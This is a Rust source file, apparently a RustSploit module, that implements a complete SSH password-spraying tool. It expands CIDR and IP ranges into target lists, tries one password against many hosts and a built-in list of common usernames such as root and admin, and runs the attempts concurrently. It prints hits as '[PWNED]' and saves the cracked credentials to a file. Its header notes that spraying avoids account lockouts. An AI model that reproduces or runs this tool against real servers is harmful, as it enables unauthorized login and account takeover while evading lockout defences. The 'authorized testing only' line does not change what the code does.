//! SSH Password Spray Module
//! 
//! Based on SSHPWN framework - sprays single password across multiple targets/users.
//! Useful for avoiding account lockouts while testing common passwords.
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    collections::HashSet,
    fs::File,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    time::{Duration, Instant},
};

use anyhow::Context;
use tokio::{
    sync::Semaphore,
    task::spawn_blocking,
    time::sleep,
};
use ipnetwork::IpNetwork;

const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const DEFAULT_THREADS: usize = 20;
const PROGRESS_INTERVAL_SECS: u64 = 2;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSH Password Spray                                              ║".cyan());
    println!("{}", "║   Spray single password across multiple targets/users             ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Benefits:                                                       ║".cyan());
    println!("{}", "║   - Avoids account lockouts                                       ║".cyan());
    println!("{}", "║   - Tests common passwords across many hosts                      ║".cyan());
    println!("{}", "║   - Efficient for large network assessments                       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Statistics tracking
struct Statistics {
    total_attempts: AtomicU64,
    successful: AtomicU64,
    failed: AtomicU64,
    errors: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful: AtomicU64::new(0),
            failed: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }
    
    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.errors.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
    
    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful.load(Ordering::Relaxed);
        let failed = self.failed.load(Ordering::Relaxed);
        let errors = self.errors.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
        
        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }
    
    fn print_summary(&self) {
        println!();
        println!("{}", "=== Spray Summary ===".cyan().bold());
        println!("Total attempts: {}", self.total_attempts.load(Ordering::Relaxed));
        println!("Successful: {}", self.successful.load(Ordering::Relaxed).to_string().green());
        println!("Failed: {}", self.failed.load(Ordering::Relaxed));
        println!("Errors: {}", self.errors.load(Ordering::Relaxed));
        println!("Elapsed: {:.2}s", self.start_time.elapsed().as_secs_f64());
    }
}

/// Credential result
#[derive(Clone, Debug)]
pub struct SprayResult {
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

/// Try SSH authentication
fn try_ssh_auth(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Result<bool> {
    let addr = format!("{}:{}", host, port);
    
    let tcp = TcpStream::connect_timeout(
        &addr.parse()?,
        Duration::from_secs(timeout_secs),
    )?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    
    match sess.userauth_password(username, password) {
        Ok(_) => Ok(sess.authenticated()),
        Err(_) => Ok(false),
    }
}

/// Parse targets from string (CIDR, range, single IP)
fn parse_targets(spec: &str, port: u16) -> Vec<(String, u16)> {
    let mut targets = Vec::new();
    
    for s in spec.split(&[',', ' ', '\n'][..]) {
        let s = s.trim();
        if s.is_empty() {
            continue;
        }
        
        // Try CIDR
        if s.contains('/') {
            if let Ok(network) = s.parse::<IpNetwork>() {
                for ip in network.iter().take(65536) {
                    targets.push((ip.to_string(), port));
                }
                continue;
            }
        }
        
        // Try IP range (e.g., 192.168.1.1-254)
        if s.contains('-') && s.contains('.') {
            let parts: Vec<&str> = s.rsplitn(2, '.').collect();
            if parts.len() == 2 {
                if let Some((start_str, end_str)) = parts[0].split_once('-') {
                    if let (Ok(start), Ok(end)) = (start_str.parse::<u8>(), end_str.parse::<u8>()) {
                        let base = parts[1];
                        for i in start..=end {
                            targets.push((format!("{}.{}", base, i), port));
                        }
                        continue;
                    }
                }
            }
        }
        
        // Single IP/hostname
        targets.push((s.to_string(), port));
    }
    
    targets
}

/// Load list from file
fn load_list_from_file(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let items: Vec<String> = reader
        .lines()
        .filter_map(|l| l.ok())
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    Ok(items)
}

/// Main spray function
pub async fn password_spray(
    targets: Vec<(String, u16)>,
    usernames: &[String],
    password: &str,
    threads: usize,
    timeout_secs: u64,
) -> Vec<SprayResult> {
    let total = targets.len() * usernames.len();
    println!("{}", format!("[*] Spraying '{}' against {} targets, {} users ({} total attempts)", 
        password, targets.len(), usernames.len(), total).cyan());
    
    let results = Arc::new(tokio::sync::Mutex::new(Vec::new()));
    let stats = Arc::new(Statistics::new());
    let semaphore = Arc::new(Semaphore::new(threads));
    let stop = Arc::new(AtomicBool::new(false));
    
    // Progress reporter
    let stats_clone = Arc::clone(&stats);
    let stop_clone = Arc::clone(&stop);
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });
    
    // Spray tasks
    let mut handles = Vec::new();
    
    for (host, port) in targets {
        for user in usernames {
            let semaphore = Arc::clone(&semaphore);
            let results = Arc::clone(&results);
            let stats = Arc::clone(&stats);
            let host = host.clone();
            let user = user.clone();
            let password = password.to_string();
            
            let handle: tokio::task::JoinHandle<Result<()>> = tokio::spawn(async move {
                let _permit = semaphore.acquire().await.context("Semaphore acquisition failed")?;
                
                let host_clone = host.clone();
                let user_clone = user.clone();
                let pass_clone = password.clone();
                
                let result = spawn_blocking(move || {
                    try_ssh_auth(&host_clone, port, &user_clone, &pass_clone, timeout_secs)
                }).await;
                
                match result {
                    Ok(Ok(true)) => {
                        stats.record_attempt(true, false);
                        let cred = SprayResult {
                            host: host.clone(),
                            port,
                            username: user.clone(),
                            password: password.clone(),
                        };
                        println!("\r{}", format!("[PWNED] {}:{} @ {}:{}", user, password, host, port).red().bold());
                        let _ = std::io::Write::flush(&mut std::io::stdout());
                        results.lock().await.push(cred);
                    }
                    Ok(Ok(false)) => {
                        stats.record_attempt(false, false);
                    }
                    _ => {
                        stats.record_attempt(false, true);
                    }
                }
                Ok(())
            });
            
            handles.push(handle);
        }
    }
    
    // Wait for all tasks
    for handle in handles {
        let _ = handle.await;
    }
    
    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    // Print summary
    stats.print_summary();
    
    let results = results.lock().await;
    results.clone()
}

/// Save results to file
fn save_results(results: &[SprayResult], path: &str) -> Result<()> {
    let mut file = File::create(path)?;
    
    writeln!(file, "# SSH Password Spray Results")?;
    writeln!(file, "# Generated by RustSploit")?;
    writeln!(file, "# Total: {} credentials found", results.len())?;
    writeln!(file)?;
    
    for result in results {
        writeln!(file, "{}:{} @ {}:{}", result.username, result.password, result.host, result.port)?;
    }
    
    println!("{}", format!("[+] Results saved to: {}", path).green());
    Ok(())
}

/// Prompt helper
async fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    Ok(input.trim().to_string())
}

fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_yes_no(message: &str, default: bool) -> Result<bool> {
    let hint = if default { "Y/n" } else { "y/N" };
    print!("{} [{}]: ", message, hint);
    std::io::stdout()
        .flush()
        .context("Failed to flush stdout")?;
    let mut input = String::new();
    std::io::stdin()
        .read_line(&mut input)
        .context("Failed to read input")?;
    let trimmed = input.trim().to_lowercase();
    match trimmed.as_str() {
        "" => Ok(default),
        "y" | "yes" => Ok(true),
        "n" | "no" => Ok(false),
        _ => Ok(default),
    }
}

/// Default usernames to spray
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "administrator", "ubuntu",
    "guest", "test", "oracle", "postgres", "mysql",
];

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Get password to spray
    let password = prompt("Password to spray").await?;
    if password.is_empty() {
        return Err(anyhow!("Password is required"));
    }
    
    // Get port
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(DEFAULT_SSH_PORT);
    
    // Get targets
    let mut targets = Vec::new();
    
    // Add initial target
    let host = normalize_target(target);
    if !host.is_empty() {
        println!("{}", format!("[*] Initial target: {}", host).cyan());
        targets.extend(parse_targets(&host, port));
    }
    
    // Get additional targets
    let more_targets = prompt("Additional targets (comma-separated, CIDR, or leave empty)").await?;
    if !more_targets.is_empty() {
        targets.extend(parse_targets(&more_targets, port));
    }
    
    // Load from file?
    if prompt_yes_no("Load targets from file?", false)? {
        let file_path = prompt("File path").await?;
        if !file_path.is_empty() {
            match load_list_from_file(&file_path) {
                Ok(file_targets) => {
                    println!("{}", format!("[*] Loaded {} targets from file", file_targets.len()).cyan());
                    for t in file_targets {
                        targets.extend(parse_targets(&t, port));
                    }
                }
                Err(e) => {
                    println!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }
    
    // Deduplicate targets
    let unique: HashSet<_> = targets.into_iter().collect();
    let targets: Vec<_> = unique.into_iter().collect();
    
    if targets.is_empty() {
        return Err(anyhow!("No targets specified"));
    }
    
    println!("{}", format!("[*] Total unique targets: {}", targets.len()).cyan());
    
    // Get usernames
    let mut usernames: Vec<String> = Vec::new();
    
    if prompt_yes_no("Load usernames from file?", false)? {
        let file_path = prompt("Username file path").await?;
        if !file_path.is_empty() {
            match load_list_from_file(&file_path) {
                Ok(loaded) => {
                    println!("{}", format!("[*] Loaded {} usernames from file", loaded.len()).cyan());
                    usernames.extend(loaded);
                }
                Err(e) => {
                    println!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }
    
    // Add default usernames?
    if usernames.is_empty() || prompt_yes_no("Also test default usernames?", true)? {
        for user in DEFAULT_USERNAMES {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
        }
    }
    
    if usernames.is_empty() {
        return Err(anyhow!("No usernames to test"));
    }
    
    // Get scan options
    let threads: usize = prompt_default("Concurrent threads", &DEFAULT_THREADS.to_string())?
        .parse()
        .unwrap_or(DEFAULT_THREADS);
    let timeout: u64 = prompt_default("Connection timeout (seconds)", &DEFAULT_TIMEOUT_SECS.to_string())?
        .parse()
        .unwrap_or(DEFAULT_TIMEOUT_SECS);
    
    println!();
    
    // Run spray
    let results = password_spray(targets, &usernames, &password, threads, timeout).await;
    
    // Save results?
    if !results.is_empty() && prompt_yes_no("Save results to file?", true)? {
        let output_path = prompt_default("Output file", "ssh_spray_results.txt")?;
        if let Err(e) = save_results(&results, &output_path) {
            println!("{}", format!("[-] Failed to save: {}", e).red());
        }
    }
    
    println!();
    println!("{}", format!("[*] Password spray complete. Found {} valid credentials.", results.len()).green());
    
    Ok(())
}

